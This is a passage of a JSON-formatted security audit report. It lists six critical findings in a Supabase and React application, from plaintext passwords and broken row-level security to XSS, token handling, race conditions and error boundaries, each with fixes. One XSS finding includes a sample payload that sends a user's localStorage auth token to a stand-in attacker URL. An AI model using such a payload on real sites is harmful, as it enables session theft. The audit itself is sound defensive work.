      "id": 1,
      "title": "Passwords Stored in Plain Text",
      "severity": "CRITICAL",
      "file": "supabase/schema.sql",
      "lineNumber": 69,
      "description": "Company login credentials stored without encryption or hashing",
      "riskScenario": "Database breach → All company credentials and state tax accounts exposed",
      "compliance": "Violates UZ Law on Personal Data Protection, GDPR compliance",
      "exploitScenario": "Any database compromise leads to credentials theft. Attacker gains access to state systems.",
      "fixComplexity": "Medium",
      "fixTime": "1-2 days",
      "solution": {
        "approach": "Use bcrypt/argon2 for password hashing",
        "steps": [
          "Add bcrypt library to package.json",
          "Create migration to add password_hash and password_salt columns",
          "Hash all existing passwords with migration script",
          "Update upsertCompany function to hash passwords",
          "Never expose passwords to frontend",
          "Add audit logging for password access"
        ],
        "codeExample": "password_hash = await bcrypt.hash(plainPassword, saltRounds: 12)"
      },
      "dataBreachProbability": "95%"
    },
    {
      "id": 2,
      "title": "Broken Row Level Security (RLS)",
      "severity": "CRITICAL",
      "files": [
        "supabase/schema.sql",
        "lib/permissions.ts"
      ],
      "vulnerabilities": [
        {
          "name": "No JWT signature verification in RLS queries",
          "impact": "Token tampering is possible - RLS doesn't validate token authenticity",
          "fix": "Implement JWT verification trigger in database"
        },
        {
          "name": "Missing DELETE RLS policies",
          "impact": "Users can delete other users' data through direct API calls",
          "fix": "Add DELETE policies to ALL sensitive tables"
        },
        {
          "name": "Recursive RLS queries",
          "impact": "Potential infinite loops or exponential query time",
          "fix": "Flatten RLS logic, use application-level authorization"
        },
        {
          "name": "Session hijacking via localStorage",
          "impact": "XSS attack can steal JWT token from localStorage, attacker can access user's data",
          "fix": "Use HttpOnly cookies instead of localStorage"
        }
      ],
      "fixTime": "2-3 days",
      "checklist": [
        "Implement JWT verification trigger",
        "Add DELETE RLS policies to all tables",
        "Add UPDATE RLS policies for sensitive fields",
        "Create audit_log table with triggers",
        "Migrate tokens from localStorage to HttpOnly cookies",
        "Test RLS with multiple roles and cross-company access",
        "Penetration test RLS bypass scenarios"
      ]
    },
    {
      "id": 3,
      "title": "No Input Validation - XSS & SQL Injection Vectors",
      "severity": "CRITICAL",
      "files": [
        "lib/supabaseData.ts",
        "App.tsx",
        "components/"
      ],
      "vulnerabilities": [
        {
          "type": "XSS (Cross-Site Scripting)",
          "example": "Company name rendered without sanitization in JSX",
          "exploitCode": "accountantName: '<img src=x onerror=\"fetch(\\\"http://attacker/steal?token=\\\" + localStorage.auth)\"/>'"
        },
        {
          "type": "SQL Injection",
          "note": "Reduced by Supabase parameterization, but not checked",
          "risk": "If custom SQL or RPC functions are created, injection is possible"
        }
      ],
      "fixTime": "2 days",
      "solution": {
        "install": ["npm install zod dompurify"],
        "steps": [
          "Create validation schemas with zod for all inputs",
          "Install dompurify for HTML sanitization",
          "Add Content Security Policy (CSP) header",
          "Validate all API request bodies",
          "Sanitize all user-generated content before rendering",
          "Add pre-commit hooks to catch validation errors"
        ]
      }
    },
    {
      "id": 4,
      "title": "Race Conditions in Batch Operations",
      "severity": "CRITICAL",
      "file": "lib/supabaseData.ts",
      "description": "Batch upsert operations not atomic - partial failures leave data inconsistent",
      "failureScenario": "Import 1000 operations, 500 succeed, 500 timeout. System thinks all succeeded. On retry: duplicates.",
      "fixTime": "1-2 days",
      "solution": {
        "approach": "Use database RPC for atomic operations",
        "wrongWay": "for (op of operations) { supabase.from('operations').upsert(op) }",
        "rightWay": "supabase.rpc('upsert_operations_atomic', { operations_input })",
        "databaseFunction": "CREATE FUNCTION upsert_operations_atomic() RETURNS JSONB AS ...",
        "feature": "Entire transaction succeeds or fails - no partial updates"
      }
    },
    {
      "id": 5,
      "title": "Broken Session & Token Management",
      "severity": "CRITICAL",
      "files": [
        "App.tsx",
        "lib/supabaseClient.ts"
      ],
      "issues": [
        {
          "issue": "Tokens stored in localStorage (accessible to XSS)",
          "impact": "Any XSS attack steals all auth tokens",
          "fix": "Use HttpOnly cookies or sessionStorage with backend"
        },
        {
          "issue": "signOut() doesn't revoke refresh token",
          "impact": "After logout, attacker can still refresh session",
          "fix": "Call auth.signOut({ scope: 'global' })"
        },
        {
          "issue": "Incomplete storage cleanup on logout",
          "impact": "Tokens remain in IndexedDB, cookies, sessionStorage",
          "fix": "Clear all storage types, not just localStorage"
        },
        {
          "issue": "No CSRF token in requests",
          "impact": "State-changing requests can be performed from other domains",
          "fix": "Add CSRF token to all POST/PUT/DELETE requests"
        }
      ],
      "fixTime": "1 day",
      "implementation": {
        "step1": "Switch to sessionStorage or HttpOnly cookies",
        "step2": "Implement proper logout with token revocation",
        "step3": "Add CSRF protection middleware",
        "step4": "Implement token rotation (refresh every 5 minutes)",
        "step5": "Clear all storage on logout"
      }
    },
    {
      "id": 6,
      "title": "No Error Boundary - App Crashes on Component Error",
      "severity": "CRITICAL",
      "file": "App.tsx",
      "description": "Single component error crashes entire application",
      "currentCode": "No error boundary wrapper",
      "fixTime": "4 hours",
      "solution": {
        "approach": "Implement React Error Boundary",
        "component": "Create ErrorBoundary.tsx",
        "lifecycle": "componentDidCatch() hook",
        "recovery": "Show error UI, allow user to reload",
        "integration": "Wrap entire app in <ErrorBoundary></ErrorBoundary>"
      }
    }
  ],
